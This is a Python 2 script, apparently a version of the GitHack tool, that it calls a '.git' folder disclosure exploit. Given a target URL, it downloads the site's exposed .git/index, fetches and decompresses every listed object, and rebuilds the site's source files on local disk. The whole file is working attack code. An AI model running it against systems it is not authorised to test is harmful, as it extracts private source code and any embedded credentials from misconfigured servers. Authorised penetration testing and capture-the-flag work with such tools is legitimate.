#!/usr/bin/env python
# -*- encoding: utf-8 -*-

import sys
import urllib2
import os
import urlparse
import zlib
import threading
import Queue
import re
import time
from lib.parser import parse

if len(sys.argv) == 1:
    msg = """

A '.git' folder disclosure exploit. By LiJieJie

Usage: GitHack.py http://www.target.com/

bug-report: my[at]lijiejie.com (http://www.lijiejie.com)
"""
    print (msg)
    sys.exit(0)

base_url = sys.argv[-1]

print (base_url)

# 创建文件夹
domain = urlparse.urlparse(sys.argv[-1]).netloc.replace(':','_').replace('.','_')
# 这里只要netloc
# ParseResult(scheme='http', netloc='172.28.100.108:8087', path='/.git/', params='', query='', fragment='')
# print (domain)
if not os.path.exists(domain):
	os.mkdir(domain)
print ('[+] Download and parse index file ...')

# 下载index文件函数
def requests_data(url):
	handers = {'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'}
	request = urllib2.Request(url, None, handers)
	return urllib2.urlopen(request).read()


data = requests_data(base_url + '/.git/index')
# print (base_url + '.git/index')
# print (str(data))
with open('index', 'wb') as f:
	f.write(data)
sha1 = []
file_name = []
for entry in parse('index'):
	# print (entry.keys())
	if 'sha1' in entry.keys():
		sha1.append(entry['sha1'].strip())
		file_name.append(entry['name'].strip())

for i in range(len(sha1)):
	try:
		# print (sha1[i][:2])
		# 拼接URI
		folder = '/.git/objects/{0}/'.format(sha1[i][:2])
		# print (base_url + folder + sha1[i][2:])
		# 拼接objects下压缩文件(哈希值)下载地址
		# http://172.28.100.108:8087/.git/objects/6b/1da9533f5731c8d776aea3b197553bce1e783b
		data = requests_data(base_url + folder + sha1[i][2:])
		try:
			data = zlib.decompress(data)
			# print (data)
		except:
			print ('[Error] Fail to decompress {0}'.format(file_name))
		# blob 54 this is readme
		# 正则表达式匹配多余的字符(blob 54)，并且替换为空
		data = re.sub('blob \d+\00', '', data)
		# print (data)
		# 将多个路径组合后返回
		new_file_name = ''.join(file_name[i])
		# 构建目录,os.path.join()  路径拼接
		target_dir = os.path.join(domain, os.path.dirname(new_file_name))
		# 如果目录不存在则创建
		if target_dir and not os.path.exists(target_dir):
			os.makedirs(target_dir)
		# 打开文件并写入数据
		with open(os.path.join(domain, new_file_name), 'wb') as f:
			f.write(data)
		print ('[OK] {0}'.format(new_file_name))

	except urllib2.HTTPError as e:
		if str(e).find('HTTP Error 404') >=0:
			print ('[File not found] {0}'.format(new_file_name))
			break
	except Exception as e:
		print ('[Error] {0}'.format(e))